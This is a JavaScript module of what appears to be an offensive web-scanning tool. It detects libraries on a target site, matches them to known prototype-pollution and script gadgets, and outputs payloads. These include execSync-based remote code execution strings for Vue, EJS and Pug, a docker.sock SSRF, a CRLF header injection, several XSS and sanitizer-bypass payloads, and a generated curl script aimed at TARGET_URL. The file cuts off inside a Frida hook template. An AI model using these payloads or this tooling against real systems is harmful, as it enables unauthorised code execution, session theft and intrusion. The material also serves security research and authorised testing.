// ╔══════════════════════════════════════════════════════════════════════════╗
// ║  GENKI-PROBER MODULE: COMPREHENSIVE GADGET FINDER v1.0                 ║
// ║  PP Gadgets + Script Gadgets + Chain Detection + Frida Hooks           ║
// ║                                                                        ║
// ║  Research sources:                                                     ║
// ║   • KTH-LangSec/ghunter4node — Universal PP Gadgets in Node.js        ║
// ║   • YesWeHack PP-Finder — AST-based gadget detection                   ║
// ║   • GMSGadget — Script gadgets for CSP/sanitizer bypass                ║
// ║   • Bugcrowd — Gadget chaining methodology                            ║
// ║   • USENIX Security 2024 — Cornelissen et al. PP analysis             ║
// ║   • FollowMyFlow — Taint analysis for PP detection                    ║
// ╚══════════════════════════════════════════════════════════════════════════╝
const fs = require('fs');
const path = require('path');

class GadgetFinder {
  constructor(logger, config) {
    this.logger = logger;
    this.config = config;
    this.findings = [];
    this.gadgets = { pp: [], script: [], chain: [], sspp: [] };
    this.detectedLibs = {};
    this.cspDefenseLevel = 'unknown'; // Set by setCspDefenseLevel() from security-scanner
    
    // ═══════════════════════════════════════════════════
    // KNOWN PP GADGET DATABASE (from research)
    // Each: { lib, version, gadget, impact, payload }
    // ═══════════════════════════════════════════════════
    this.PP_GADGETS_DB = [
      // VueJS SSR — RCE via ssrCssVars → Function()
      { lib: 'vue', below: '3.2.48', gadget: 'ssrCssVars', impact: 'rce',
        payload: '{"__proto__":{"ssrCssVars":"1}; return _push(process.mainModule.require(\'child_process\').execSync(\'id\').toString())//"}}',
        desc: 'Vue SSR: ssrCssVars flows into Function() constructor' },
      // JSDom — RCE via runScripts + script src
      { lib: 'jsdom', below: '22.0.0', gadget: 'runScripts', impact: 'rce',
        payload: '{"__proto__":{"runScripts":"dangerously","resources":"usable"}}',
        desc: 'JSDOM: runScripts=dangerously enables script execution' },
      // Fastify — Universal XSS via content-type injection
      { lib: 'fastify', below: '4.14.0', gadget: 'content-type', impact: 'xss',
        payload: '{"__proto__":{"content-type":"text/html;json;"}}',
        desc: 'Fastify: pollute content-type to inject HTML responses' },
      // Axios — SSRF via socketPath
      { lib: 'axios', below: '1.4.0', gadget: 'socketPath', impact: 'ssrf',
        payload: '{"__proto__":{"socketPath":"/var/run/docker.sock"}}',
        desc: 'Axios: redirect requests to Unix socket (Docker RCE)' },
      // Express — ETag cache bypass (detection probe)  
      { lib: 'express', below: '5.0.0', gadget: 'etag', impact: 'detection',
        payload: '{"__proto__":{"eTag":""}}',
        desc: 'Express: disable etag caching to detect SSPP' },
      // Lodash — merge/defaultsDeep PP source
      { lib: 'lodash', below: '4.17.21', gadget: 'merge/defaultsDeep', impact: 'pp_source',
        payload: '_.merge({}, {"__proto__":{"polluted":true}})',
        desc: 'Lodash merge/defaultsDeep allows PP' },
      // jQuery — $.extend deep merge PP
      { lib: 'jquery', below: '4.0.0', gadget: 'extend', impact: 'pp_source',
        payload: '$.extend(true, {}, {"__proto__":{"polluted":true}})',
        desc: 'jQuery $.extend(true,...) allows PP' },
      // Handlebars — RCE via template compilation
      { lib: 'handlebars', below: '4.7.8', gadget: 'template', impact: 'rce',
        payload: '{"__proto__":{"pendingContent":"<script>alert(1)</script>"}}',
        desc: 'Handlebars template injection via PP' },
      // EJS — RCE via outputFunctionName
      { lib: 'ejs', below: '3.1.10', gadget: 'outputFunctionName', impact: 'rce',
        payload: '{"__proto__":{"outputFunctionName":"x;process.mainModule.require(\'child_process\').execSync(\'id\')//"}}',
        desc: 'EJS: outputFunctionName flows into eval' },
      // Pug — RCE via block
      { lib: 'pug', below: '3.0.3', gadget: 'block', impact: 'rce',
        payload: '{"__proto__":{"block":{"type":"Text","val":"x])+process.mainModule.require(\'child_process\').execSync(\'id\')//"}}}',
        desc: 'Pug: block body flows into Function()' },
      // MongoDB/Mongoose — Query injection
      { lib: 'mongoose', below: '7.0.0', gadget: '$where/$gt/$ne', impact: 'nosql_injection',
        payload: '{"__proto__":{"$gt":""}}',
        desc: 'MongoDB: PP enables NoSQL query manipulation' },
      // Minimist — PP via argv parsing
      { lib: 'minimist', below: '1.2.8', gadget: 'argv', impact: 'pp_source',
        payload: '--__proto__.polluted=true',
        desc: 'Minimist argv parsing allows PP' },
      // flat — PP via unflatten
      { lib: 'flat', below: '6.0.0', gadget: 'unflatten', impact: 'pp_source',
        payload: '{"__proto__.polluted":"true"}',
        desc: 'flat unflatten allows PP via dot notation' },
      // Webpack dev server — open redirect  
      { lib: 'webpack-dev-server', below: '4.13.0', gadget: 'open', impact: 'open_redirect',
        payload: '{"__proto__":{"open":"https://evil.com"}}',
        desc: 'webpack-dev-server: pollute open to redirect' },
      // child_process — Universal Node.js shell gadget
      { lib: 'node', below: '99.0.0', gadget: 'shell/env/NODE_OPTIONS', impact: 'rce',
        payload: '{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/environ"}}',
        desc: 'Node.js: child_process env/shell injection via PP' },
      // node:http — status message injection
      { lib: 'node', below: '99.0.0', gadget: 'statusMessage', impact: 'header_injection',
        payload: '{"__proto__":{"statusMessage":"X\\r\\nSet-Cookie: hacked=1"}}',
        desc: 'Node.js http: CRLF injection via statusMessage PP' },
    ];

    // ═══════════════════════════════════════════════════
    // SCRIPT GADGETS DB (from GMSGadget research)
    // Gadgets that bypass CSP/DOMPurify via library behavior
    // ═══════════════════════════════════════════════════
    this.SCRIPT_GADGETS_DB = [
      { lib: 'angular', pattern: /angular(?:\.min)?\.js/i, gadget: 'ng-app template injection',
        bypass: 'csp:unsafe-eval', payload: '<div ng-app>{{constructor.constructor("alert(1)")()}}' },
      { lib: 'angular', pattern: /angular(?:\.min)?\.js/i, gadget: 'ng-csp with event handler',
        bypass: 'csp:strict-dynamic', payload: '<div ng-app ng-csp><div ng-click=$event.view.alert(1)>click</div>' },
      { lib: 'vue', pattern: /vue(?:\.min|\.runtime)?\.js/i, gadget: 'v-html directive',
        bypass: 'sanitizer', payload: '<div id=app v-html="userInput"></div>' },
      { lib: 'jquery', pattern: /jquery(?:\.min)?\.js/i, gadget: 'jQuery.html() sink',
        bypass: 'n/a', payload: '$(selector).html(userInput)' },
      { lib: 'jquery', pattern: /jquery(?:\.min)?\.js/i, gadget: 'jQuery.globalEval',
        bypass: 'csp:strict-dynamic', payload: 'jQuery.globalEval("alert(1)")' },
      { lib: 'dompurify', pattern: /dompurify/i, gadget: 'namespace confusion',
        bypass: 'sanitizer', payload: '<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>' },
      { lib: 'bootstrap', pattern: /bootstrap(?:\.min)?\.js/i, gadget: 'data-* attribute gadget',
        bypass: 'csp:strict-dynamic', payload: '<div data-bs-toggle="tooltip" data-bs-html="true" title="<img src=x onerror=alert(1)>">' },
      { lib: 'mermaid', pattern: /mermaid/i, gadget: 'XSS via diagram rendering',
        bypass: 'n/a', payload: 'graph TD;A["<img src=x onerror=alert(1)>"]' },
      { lib: 'marked', pattern: /marked(?:\.min)?\.js/i, gadget: 'HTML injection in markdown',
        bypass: 'n/a', payload: '[XSS](javascript:alert(1))' },
      { lib: 'highlight.js', pattern: /highlight(?:\.min)?\.js/i, gadget: 'HTML injection',
        bypass: 'n/a', payload: '<code><img src=x onerror=alert(1)></code>' },
      { lib: 'mathjax', pattern: /mathjax/i, gadget: 'href in math elements',
        bypass: 'csp:strict-dynamic', payload: '\\href{javascript:alert(1)}{click}' },
      { lib: 'axios', pattern: /axios(?:\.min)?\.js/i, gadget: 'DOM clobbering name override',
        bypass: 'n/a', payload: '<form name=axios><input name=defaults><input name=headers>' },
      { lib: 'lodash', pattern: /lodash(?:\.min)?\.js/i, gadget: 'template() RCE',
        bypass: 'n/a', payload: '_.template("<%= constructor.constructor(\'alert(1)\')() %>")()'  },
    ];

    // ═══════════════════════════════════════════════════
    // SSPP DETECTION PROBES — server-side PP detection
    // ═══════════════════════════════════════════════════
    this.SSPP_PROBES = [
      { name: 'express_etag', server: 'express',
        desc: 'Pollute __proto__.eTag to disable caching, then check if If-None-Match returns 200 instead of 304',
        payloads: [
          { body: '{"__proto__":{"eTag":""}}', verify: 'Send If-None-Match: * → expect 200 instead of 304' },
        ]},
      { name: 'fastify_content_type', server: 'fastify',
        desc: 'Pollute __proto__.content-type to inject text/html into JSON responses',
        payloads: [
          { body: '{"__proto__":{"content-type":"text/html;json;"}}', verify: 'Check if response Content-Type changes' },
        ]},
      { name: 'status_code_reflect', server: 'any',
        desc: 'Pollute __proto__.status to change response code',
        payloads: [
          { body: '{"__proto__":{"status":510}}', verify: 'Check if response status changes to 510' },
        ]},
      { name: 'json_spaces', server: 'express',
        desc: 'Pollute __proto__.json spaces to change JSON formatting',
        payloads: [
          { body: '{"__proto__":{"json spaces":10}}', verify: 'Check if JSON response gains extra indentation' },
        ]},
      { name: 'constructor_pollution', server: 'any',
        desc: 'Use constructor.prototype instead of __proto__',
        payloads: [
          { body: '{"constructor":{"prototype":{"polluted":"genki-test"}}}', verify: 'Check {}.polluted === "genki-test"' },
        ]},
    ];

    // ═══════════════════════════════════════════════════
    // PP SINK PATTERNS — code patterns that become dangerous after PP
    // (From FollowMyFlow / ghunter4node research)
    // ═══════════════════════════════════════════════════
    this.PP_SINK_PATTERNS = [
      // Access to undefined props that flow into eval/Function/exec
      { pattern: /(?:options|config|settings|opts)\[['"]?([a-zA-Z_]+)['"]?\]/g, name: 'config_access', risk: 'high' },
      // obj[key] where key is from user input
      { pattern: /\[([a-zA-Z_]+)\]\s*\(\s*\)/g, name: 'dynamic_call', risk: 'critical' },
      // child_process with options from object
      { pattern: /(?:exec|execSync|spawn|fork)\s*\([^)]*(?:options|opts|config)/g, name: 'child_process_opts', risk: 'critical' },
      // eval/Function with interpolated values
      { pattern: /(?:eval|Function|setTimeout|setInterval)\s*\(\s*(?:[^"'`\)]*\+[^"'`\)]*|`[^`]*\$\{)/g, name: 'dynamic_eval', risk: 'critical' },
      // Object.assign / spread from pollutable source
      { pattern: /Object\.assign\s*\(\s*\{\s*\}\s*,/g, name: 'object_assign_empty', risk: 'medium' },
      // Recursive merge functions (PP sources)
      { pattern: /function\s+(?:merge|extend|deepCopy|deepMerge|assign)\s*\(/g, name: 'recursive_merge', risk: 'high' },
      // for...in without hasOwnProperty check
      { pattern: /for\s*\(\s*(?:let|var|const)\s+\w+\s+in\s+\w+\s*\)\s*\{(?:(?!hasOwnProperty)[^}]){5,200}\}/g, name: 'forin_no_hasown', risk: 'medium' },
      // Template engines with options
      { pattern: /(?:render|compile|template)\s*\(\s*[^)]*(?:options|config|data)/g, name: 'template_render', risk: 'high' },
      // HTTP response with pollutable headers
      { pattern: /(?:setHeader|writeHead|header)\s*\(\s*['"](?:Content-Type|Location|Set-Cookie)/g, name: 'response_header', risk: 'medium' },
      // Constructor/prototype access patterns
      { pattern: /\bconstructor\s*\[/g, name: 'constructor_bracket', risk: 'high' },
      { pattern: /__proto__/g, name: 'proto_reference', risk: 'info' },
      // JSON.parse without validation
      { pattern: /JSON\.parse\s*\(\s*(?:req\.|request\.|body|input|data|params)/g, name: 'json_parse_input', risk: 'medium' },
      // URL constructor with options
      { pattern: /new\s+URL\s*\([^)]*(?:options|config|base)/g, name: 'url_constructor', risk: 'medium' },
    ];

    // ═══════════════════════════════════════════════════
    // CHAIN OPPORTUNITIES — gadget combinations
    // ═══════════════════════════════════════════════════
    this.CHAIN_PATTERNS = [
      { name: 'open_redirect', pattern: /(?:redirect|returnUrl|next|returnTo|continue|goto|destination|target|redir|return_path)\s*[:=]/gi, 
        desc: 'Open redirect parameter — chain with OAuth token theft or CSPT' },
      { name: 'cspt_source', pattern: /(?:window\.location|document\.URL|document\.referrer|location\.hash|location\.search).*(?:fetch|XMLHttpRequest|\.src|\.href)/g,
        desc: 'Client-side path traversal — URL-controlled resource loading' },
      { name: 'postmessage_no_origin', pattern: /(?:addEventListener|onmessage).*['"]message['"](?:(?!origin)[^}]){10,300}/g,
        desc: 'postMessage handler without origin check — chain with XSS' },
      { name: 'jsonp_endpoint', pattern: /callback\s*[:=]\s*(?:req\.|request\.)/g,
        desc: 'JSONP callback — potential XSS or data leak' },
      { name: 'dom_clobber_target', pattern: /(?:document|window)\.([a-zA-Z]+)\s*(?:\|\||&&|\?)/g,
        desc: 'DOM clobbering target — override with <a> or <form> elements' },
      { name: 'cors_wildcard', pattern: /Access-Control-Allow-Origin.*\*/g,
        desc: 'Wildcard CORS — chain with authenticated endpoints' },
      { name: 'ssrf_url_param', pattern: /(?:url|uri|link|href|src|target|path|file|page|dest)\s*[:=]\s*(?:req\.|request\.|params\.|query\.)/g,
        desc: 'URL parameter from user input — SSRF chain opportunity' },
    ];
  }

  // ═══════════════════════════════════════════════════
  // MAIN RUN
  // ═══════════════════════════════════════════════════
  async run(page, browser, jsFiles, detectedLibs, crawlerData) {
    this.logger.log('GADGET-FINDER', 'INFO', 'Starting comprehensive gadget analysis...');
    const startTime = Date.now();

    // 1. Detect libraries from JS files and crawler data
    this._detectLibraries(jsFiles, detectedLibs, crawlerData);
    
    // 2. Match PP gadgets against detected libraries
    this._findPPGadgets();
    
    // 3. Match script gadgets against detected libraries
    this._findScriptGadgets(jsFiles);
    
    // 4. Scan JS code for PP sink patterns
    this._scanPPSinks(jsFiles);
    
    // 5. Scan for chain opportunities
    this._scanChainOpportunities(jsFiles);
    
    // 6. Generate SSPP probe payloads
    this._generateSSPPProbes(crawlerData);

    // 7. Runtime gadget detection via Puppeteer (if page available)
    if (page) {
      await this._runtimeGadgetDetection(page);
    }

    // Save results
    this._saveResults();
    
    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
    const total = this.gadgets.pp.length + this.gadgets.script.length + this.gadgets.chain.length + this.gadgets.sspp.length;
    this.logger.log('GADGET-FINDER', 'OK', 
      `Found ${total} gadgets in ${elapsed}s: ${this.gadgets.pp.length} PP, ${this.gadgets.script.length} Script, ` +
      `${this.gadgets.chain.length} Chain, ${this.gadgets.sspp.length} SSPP probes`);
  }

  // ═══════════════════════════════════════════════════
  // 1. LIBRARY DETECTION (expanded)
  // ═══════════════════════════════════════════════════
  _detectLibraries(jsFiles, detectedLibs, crawlerData) {
    // From RetireJS results
    if (detectedLibs) {
      for (const [name, info] of Object.entries(detectedLibs)) {
        this.detectedLibs[name] = info;
      }
    }

    // Scan JS filenames and content for libraries
    const libPatterns = [
      { name: 'angular', rx: /angular(?:\.min)?\.js|angular.*?(\d+\.\d+\.\d+)/i },
      { name: 'vue', rx: /vue(?:\.min|\.runtime)?\.js|vue.*?(\d+\.\d+\.\d+)/i },
      { name: 'react', rx: /react(?:\.production|\.development)?\.min\.js|react.*?(\d+\.\d+\.\d+)/i },
      { name: 'jquery', rx: /jquery(?:\.min)?\.js.*?(\d+\.\d+\.\d+)/i },
      { name: 'lodash', rx: /lodash(?:\.min)?\.js|lodash.*?(\d+\.\d+\.\d+)/i },
      { name: 'axios', rx: /axios(?:\.min)?\.js/i },
      { name: 'express', rx: /express|X-Powered-By:\s*Express/i },
      { name: 'fastify', rx: /fastify/i },
      { name: 'handlebars', rx: /handlebars(?:\.min)?\.js|handlebars.*?(\d+\.\d+\.\d+)/i },
      { name: 'ejs', rx: /ejs(?:\.min)?\.js/i },
      { name: 'pug', rx: /pug(?:\.min)?\.js/i },
      { name: 'mongoose', rx: /mongoose/i },
      { name: 'dompurify', rx: /dompurify|DOMPurify/i },
      { name: 'bootstrap', rx: /bootstrap(?:\.min)?\.js|bootstrap.*?(\d+\.\d+\.\d+)/i },
      { name: 'mermaid', rx: /mermaid(?:\.min)?\.js/i },
      { name: 'marked', rx: /marked(?:\.min)?\.js/i },
      { name: 'highlight', rx: /highlight(?:\.min)?\.js/i },
      { name: 'mathjax', rx: /mathjax/i },
      { name: 'minimist', rx: /minimist/i },
      { name: 'flat', rx: /\bflat\b.*unflatten/i },
      { name: 'webpack-dev-server', rx: /webpack-dev-server/i },
    ];

    // ── 3rd-Party SDK Detection Patterns ──
    const THIRD_PARTY_PATTERNS = [
      /appleid\.auth/i, /appleid\.cdn-apple/i,           // Apple Sign-In SDK
      /platform\.twitter/i, /static\.ads-twitter/i,       // Twitter/X widgets
      /connect\.facebook/i, /sdk\.facebook/i,              // Facebook SDK
      /apis\.google\.com/i, /accounts\.google\.com/i,      // Google APIs
      /cdn\.jsdelivr/i, /cdnjs\.cloudflare/i, /unpkg\.com/i, // Public CDNs
      /sentry[-_.]/i, /bugsnag/i, /datadog[-_.]/i,        // Error tracking
      /mixpanel/i, /segment\./i, /amplitude/i,             // Analytics
      /intercom[-_.]/i, /zendesk/i, /crisp\./i,           // Chat widgets
      /recaptcha/i, /hcaptcha/i, /turnstile/i,             // CAPTCHA
      /stripe\.com/i, /paypal/i,                            // Payment
      /gtag/i, /google-analytics/i, /googletagmanager/i,   // Google Analytics/GTM
      /hotjar/i, /clarity\.ms/i,                            // Session replay
      /websdk\.appsflyer/i,                                 // AppsFlyer
    ];

    for (const jsFile of jsFiles) {
      const filename = path.basename(jsFile.path || jsFile);
      let content = '';
      try { content = fs.readFileSync(jsFile.path || jsFile, 'utf8').substring(0, 50000); } catch(e) {}

      for (const { name, rx } of libPatterns) {
        if (rx.test(filename) || rx.test(content)) {
          const vMatch = (filename + ' ' + content.substring(0, 5000)).match(new RegExp(name + '[^\\d]*(\\d+\\.\\d+\\.\\d+)'));
          if (!this.detectedLibs[name]) {
            const isThirdParty = THIRD_PARTY_PATTERNS.some(p => p.test(filename));
            this.detectedLibs[name] = {
              version: vMatch?.[1] || 'unknown',
              source: filename,
              thirdParty: isThirdParty
            };
            if (isThirdParty) {
              this.logger.log('GADGET-FINDER', 'DEBUG', `Library ${name} detected in 3rd-party SDK: ${filename}`);
            }
          }
        }
      }
    }

    // Check response headers for server detection
    if (crawlerData?.responseHeaders) {
      for (const [url, headers] of Object.entries(crawlerData.responseHeaders)) {
        for (const [hdr, val] of Object.entries(headers)) {
          if (/x-powered-by/i.test(hdr) && /express/i.test(val)) this.detectedLibs['express'] = { version: 'detected', source: 'header' };
          if (/server/i.test(hdr) && /fastify/i.test(val)) this.detectedLibs['fastify'] = { version: 'detected', source: 'header' };
        }
      }
    }

    const libList = Object.entries(this.detectedLibs).map(([k,v]) => `${k}@${v.version}`).join(', ');
    this.logger.log('GADGET-FINDER', 'INFO', `Libraries detected: ${libList || 'none'}`);
  }

  // ═══════════════════════════════════════════════════
  // 2. PP GADGET MATCHING
  // ═══════════════════════════════════════════════════
  _findPPGadgets() {
    for (const gadget of this.PP_GADGETS_DB) {
      const detected = this.detectedLibs[gadget.lib];
      if (!detected) continue;
      
      const version = detected.version;
      const isVulnerable = version === 'unknown' || version === 'detected' || this._versionBelow(version, gadget.below);
      
      if (isVulnerable) {
        const baseSeverity = gadget.impact === 'rce' ? 'critical' : gadget.impact === 'ssrf' ? 'high' : 'medium';
        // ── FP Fix: Downgrade 3rd-party SDK gadgets to info ──
        const severity = detected.thirdParty ? 'info' : baseSeverity;
        const finding = {
          type: 'pp_gadget', severity, library: gadget.lib, version,
          gadget: gadget.gadget, impact: gadget.impact, payload: gadget.payload,
          desc: gadget.desc, source: detected.source,
          thirdParty: detected.thirdParty || false,
          note: detected.thirdParty ? `3rd-party SDK (${detected.source}) — not target-owned code` : undefined
        };
        this.gadgets.pp.push(finding);
        this.findings.push(finding);
        const tag = detected.thirdParty ? '3P' : 'TARGET';
        this.logger.log('GADGET-FINDER', 'FIND', `[${severity.toUpperCase()}] PP Gadget [${tag}]: ${gadget.lib}@${version} → ${gadget.gadget} (${gadget.impact})`,
          gadget.desc);
      }
    }
  }

  // ═══════════════════════════════════════════════════
  // 3. SCRIPT GADGET MATCHING  
  // ═══════════════════════════════════════════════════
  _findScriptGadgets(jsFiles) {
    const jsUrls = jsFiles.map(f => f.url || path.basename(f.path || f)).join(' ');
    
    for (const gadget of this.SCRIPT_GADGETS_DB) {
      if (gadget.pattern.test(jsUrls) || this.detectedLibs[gadget.lib]) {
        // ── FP Fix: Check 3rd-party status + CSP context ──
        const libInfo = this.detectedLibs[gadget.lib];
        const isTP = libInfo?.thirdParty || false;
        let severity = isTP ? 'info' : 'medium';
        let note = isTP ? `3rd-party SDK — not exploitable in target context` : undefined;

        // If bypass relies on CSP weakness but target has strong CSP, downgrade
        if (gadget.bypass?.includes('csp') && this.cspDefenseLevel === 'strong') {
          severity = 'info';
          note = 'CSP strict-dynamic + nonce present — gadget cannot bypass';
        }

        const finding = {
          type: 'script_gadget', severity, library: gadget.lib,
          gadget: gadget.gadget, bypass: gadget.bypass, payload: gadget.payload,
          desc: `${gadget.lib}: ${gadget.gadget} — can bypass ${gadget.bypass}`,
          thirdParty: isTP, note
        };
        this.gadgets.script.push(finding);
        this.findings.push(finding);
        const tag = isTP ? '3P' : 'TARGET';
        this.logger.log('GADGET-FINDER', 'FIND', `[${severity.toUpperCase()}] Script Gadget [${tag}]: ${gadget.lib} → ${gadget.gadget} | Bypasses: ${gadget.bypass}`);
      }
    }
  }

  // ═══════════════════════════════════════════════════
  // 4. PP SINK PATTERN SCANNING (code analysis)
  // ═══════════════════════════════════════════════════
  _scanPPSinks(jsFiles) {
    let totalHits = 0;
    for (const jsFile of jsFiles) {
      const filePath = jsFile.path || jsFile;
      const filename = path.basename(filePath);
      // Skip massive vendor bundles for sink scanning (too noisy)
      if (/vendor|defaultVendor|pendo|analytics/i.test(filename)) continue;
      
      let content;
      try { content = fs.readFileSync(filePath, 'utf8'); } catch(e) { continue; }
      
      for (const sink of this.PP_SINK_PATTERNS) {
        const matches = content.match(sink.pattern);
        if (matches && matches.length > 0) {
          // Only report significant findings (skip info level unless many)
          if (sink.risk === 'info' && matches.length < 5) continue;
          totalHits += matches.length;
          
          if (sink.risk === 'critical' || sink.risk === 'high') {
            const finding = {
              type: 'pp_sink', severity: sink.risk, pattern: sink.name,
              file: filename, count: matches.length,
              samples: matches.slice(0, 3).map(m => m.substring(0, 100)),
              desc: `${sink.name} pattern found ${matches.length}x in ${filename}`
            };
            this.findings.push(finding);
            this.logger.log('GADGET-FINDER', 'FIND', `[HIGH] PP Sink: ${sink.name} (${matches.length}x in ${filename})`,
              matches[0].substring(0, 100));
          }
        }
      }
    }
    this.logger.log('GADGET-FINDER', 'INFO', `Scanned PP sink patterns: ${totalHits} total hits`);
  }

  // ═══════════════════════════════════════════════════
  // 5. CHAIN OPPORTUNITY DETECTION
  // ═══════════════════════════════════════════════════
  _scanChainOpportunities(jsFiles) {
    for (const jsFile of jsFiles) {
      const filePath = jsFile.path || jsFile;
      const filename = path.basename(filePath);
      if (/vendor|defaultVendor|pendo|analytics/i.test(filename)) continue;
      
      let content;
      try { content = fs.readFileSync(filePath, 'utf8'); } catch(e) { continue; }
      
      for (const chain of this.CHAIN_PATTERNS) {
        const matches = content.match(chain.pattern);
        if (matches && matches.length > 0) {
          const finding = {
            type: 'chain_opportunity', severity: 'info', pattern: chain.name,
            file: filename, count: matches.length, desc: chain.desc,
            samples: matches.slice(0, 3).map(m => m.substring(0, 120))
          };
          this.gadgets.chain.push(finding);
          this.logger.log('GADGET-FINDER', 'INFO', 
            `Chain: ${chain.name} (${matches.length}x in ${filename}) — ${chain.desc.substring(0, 80)}`);
        }
      }
    }
  }

  // ═══════════════════════════════════════════════════
  // 6. SSPP PROBE GENERATION
  // ═══════════════════════════════════════════════════
  _generateSSPPProbes(crawlerData) {
    const serverType = this.detectedLibs['express'] ? 'express' : 
                       this.detectedLibs['fastify'] ? 'fastify' : 'unknown';
    
    // Generate probes relevant to detected server
    for (const probe of this.SSPP_PROBES) {
      if (probe.server === 'any' || probe.server === serverType) {
        const finding = {
          type: 'sspp_probe', severity: 'info', name: probe.name,
          server: probe.server, desc: probe.desc,
          payloads: probe.payloads,
          // Find JSON endpoints to test
          targets: crawlerData?.apiEndpoints?.filter(ep => /POST|PUT|PATCH/.test(ep)) || []
        };
        this.gadgets.sspp.push(finding);
      }
    }
    
    if (this.gadgets.sspp.length > 0) {
      this.logger.log('GADGET-FINDER', 'INFO', 
        `Generated ${this.gadgets.sspp.length} SSPP detection probes for ${serverType} server`);
    }
  }

  // ═══════════════════════════════════════════════════
  // 7. RUNTIME GADGET DETECTION (Puppeteer in-browser)
  // ═══════════════════════════════════════════════════
  async _runtimeGadgetDetection(page) {
    try {
      const result = await page.evaluate(() => {
        const gadgets = [];
        
        // Check for DOM clobbering opportunities
        const forms = document.querySelectorAll('form[name],a[name],iframe[name],embed[name],object[name]');
        forms.forEach(el => {
          if (window[el.name] === el || document[el.name] === el) {
            gadgets.push({ type: 'dom_clobber', element: el.tagName, name: el.name });
          }
        });
        
        // Check for innerHTML/outerHTML assignments in live DOM
        const scripts = document.querySelectorAll('script:not([src])');
        scripts.forEach(s => {
          const code = s.textContent;
          if (/innerHTML\s*=|outerHTML\s*=|document\.write|\.html\s*\(/.test(code)) {
            gadgets.push({ type: 'inline_sink', preview: code.substring(0, 200) });
          }
        });
        
        // Check for unsafe postMessage listeners
        const listeners = typeof getEventListeners === 'function' ? getEventListeners(window) : {};
        if (listeners.message) {
          gadgets.push({ type: 'postmessage_listener', count: listeners.message.length });
        }
        
        // Check for PP-vulnerable global merge functions
        const mergeFns = ['merge', 'extend', 'deepMerge', 'deepCopy', 'assign', 'defaults', 'defaultsDeep'];
        mergeFns.forEach(fn => {
          if (typeof window._?.[fn] === 'function') gadgets.push({ type: 'lodash_merge', func: '_.' + fn });
          if (typeof window.$?.[fn] === 'function') gadgets.push({ type: 'jquery_merge', func: '$.' + fn });
        });
        
        // Check for Frida-hookable patterns
        const fridaTargets = [];
        if (window.WebSocket) fridaTargets.push('WebSocket');
        if (window.crypto?.subtle) fridaTargets.push('crypto.subtle');
        if (window.fetch) fridaTargets.push('fetch');
        if (window.XMLHttpRequest) fridaTargets.push('XMLHttpRequest');
        
        return { gadgets, fridaTargets };
      });
      
      if (result.gadgets.length > 0) {
        result.gadgets.forEach(g => {
          this.findings.push({ ...g, severity: 'info', type: 'runtime_gadget' });
        });
        this.logger.log('GADGET-FINDER', 'INFO', `Runtime: ${result.gadgets.length} gadgets, ${result.fridaTargets.length} Frida targets`);
      }
    } catch(e) {
      this.logger.log('GADGET-FINDER', 'WARN', `Runtime detection error: ${e.message.substring(0, 80)}`);
    }
  }

  // ═══════════════════════════════════════════════════
  // UTILITIES
  // ═══════════════════════════════════════════════════
  _versionBelow(current, target) {
    if (!current || current === 'unknown' || current === 'detected') return true;
    const c = current.split('.').map(Number);
    const t = target.split('.').map(Number);
    for (let i = 0; i < Math.max(c.length, t.length); i++) {
      const cv = c[i] || 0, tv = t[i] || 0;
      if (cv < tv) return true;
      if (cv > tv) return false;
    }
    return false;
  }

  _saveResults() {
    const dir = path.join(this.config.outputDir, 'gadgets');
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    
    // All gadgets JSON
    fs.writeFileSync(path.join(dir, 'all-gadgets.json'), JSON.stringify({
      libraries: this.detectedLibs,
      pp_gadgets: this.gadgets.pp,
      script_gadgets: this.gadgets.script,
      chain_opportunities: this.gadgets.chain,
      sspp_probes: this.gadgets.sspp,
      findings: this.findings,
    }, null, 2));
    
    // Actionable PP payloads (copy-paste ready)
    if (this.gadgets.pp.length > 0) {
      const ppPayloads = this.gadgets.pp.map(g =>
        `# ${g.library}@${g.version} — ${g.gadget} (${g.impact})\n` +
        `# ${g.desc}\n` +
        `${g.payload}\n`
      ).join('\n');
      fs.writeFileSync(path.join(dir, 'pp-payloads.txt'), ppPayloads);
    }
    
    // SSPP probe scripts (ready to run)
    if (this.gadgets.sspp.length > 0) {
      let probeScript = '#!/bin/bash\n# GENKI SSPP Detection Probes\n# Generated by GENKI-PROBER Gadget Finder\n\n';
      for (const probe of this.gadgets.sspp) {
        probeScript += `# ${probe.name} — ${probe.desc}\n`;
        for (const payload of probe.payloads) {
          probeScript += `# Verify: ${payload.verify}\n`;
          probeScript += `curl -sk -X POST -H "Content-Type: application/json" -d '${payload.body}' TARGET_URL\n\n`;
        }
      }
      fs.writeFileSync(path.join(dir, 'sspp-probes.sh'), probeScript);
    }
    
    // Frida hooks template
    const fridaTemplate = `// GENKI Frida Hooks for Web App Testing
// Usage: frida -U -f com.app.target -l genki-frida.js
// Or: frida -p <PID> -l genki-frida.js

// ═══ PROTOTYPE POLLUTION MONITOR ═══
if (typeof Proxy !== 'undefined') {
  const handler = {
    set(target, prop, value) {
      if (prop === '__proto__' || prop === 'constructor') {
        console.log('[GENKI-FRIDA] PP ATTEMPT: ' + prop + ' = ' + JSON.stringify(value).substring(0, 200));
        // Send to GENKI
        send({ type: 'pp_attempt', prop, value: String(value).substring(0, 200) });
      }
      return Reflect.set(target, prop, value);
    }
  };
}

// ═══ HOOK JSON.PARSE ═══
const origJsonParse = JSON.parse;
JSON.parse = function() {
  const result = origJsonParse.apply(this, arguments);
  if (typeof result === 'object' && result !== null) {
    if ('__proto__' in result || 'constructor' in result) {
      console.log('[GENKI-FRIDA] Dangerous JSON.parse input: ' + arguments[0]?.substring(0, 200));
      send({ type: 'dangerous_json', input: arguments[0]?.substring(0, 200) });
    }
  }
  return result;
};

// ═══ HOOK eval/Function ═══
const origEval = eval;
eval = function(code) {
  console.log('[GENKI-FRIDA] eval() called: ' + String(code).substring(0, 200));
  send({ type: 'eval_call', code: String(code).substring(0, 200) });
  return origEval.apply(this, arguments);
};

// ═══ HOOK fetch/XHR ═══
const origFetch = fetch;
fetch = function(url, opts) {
  console.log('[GENKI-FRIDA] fetch: ' + url);
  send({ type: 'fetch', url: String(url).substring(0, 300), method: opts?.method || 'GET' });
  return origFetch.apply(this, arguments);
};

// ═══ HOOK CHILD_PROCESS (Node.js) ═══
try {
  const cp = require('child_process');
  const origExec = cp.exec;
  cp.exec = function(cmd) {
    console.log('[GENKI-FRIDA] exec: ' + cmd);
